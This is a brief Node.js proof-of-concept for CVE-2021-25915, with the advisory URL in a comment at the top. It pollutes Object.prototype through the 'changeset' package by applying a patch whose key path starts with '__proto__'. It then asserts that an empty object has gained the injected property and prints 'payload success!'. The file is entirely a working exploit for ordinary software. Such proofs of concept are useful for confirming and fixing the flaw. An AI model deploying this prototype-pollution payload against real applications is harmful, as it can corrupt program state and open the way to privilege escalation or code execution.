//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25915

const { assert } = require("@firebase/util");
var changeset = require("changeset")
const patch = [{ type: 'put', key: ["__proto__","polluted"], value: "yes"}];
console.log("Before : " + {}.polluted);
changeset.apply(patch, {}, true); 

console.log("After : " + {}.polluted);
assert({}.polluted === "yes");
console.log("payload success!");

